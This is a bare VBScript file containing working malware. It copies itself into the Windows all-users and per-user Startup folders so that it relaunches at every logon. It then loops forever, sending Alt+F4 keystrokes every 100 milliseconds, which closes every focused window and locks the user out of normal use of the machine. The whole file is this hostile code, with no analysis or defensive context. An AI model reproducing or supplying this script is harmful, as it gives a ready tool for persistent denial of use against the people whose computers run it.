Set WSHShell = WScript.CreateObject("WScript.Shell")
FileName = WScript.ScriptFullName
Directory = WshShell.CurrentDirectory
Autostart = WSHShell.SpecialFolders("AllUsersStartup")
Autostart2 = WSHShell.SpecialFolders("Startup")

Set fso = CreateObject("Scripting.FileSystemObject")
Set f2 = fso.GetFile( FileName )
f2.Copy ( Autostart & "\Fil.vbs")
f2.Copy ( Autostart2 & "\Fil.vbs")

Set wshShell = wscript.CreateObject("WScript.Shell")
f = 1
do
wscript.sleep 100
wshshell.sendkeys "%{f4}"
loop while f=1
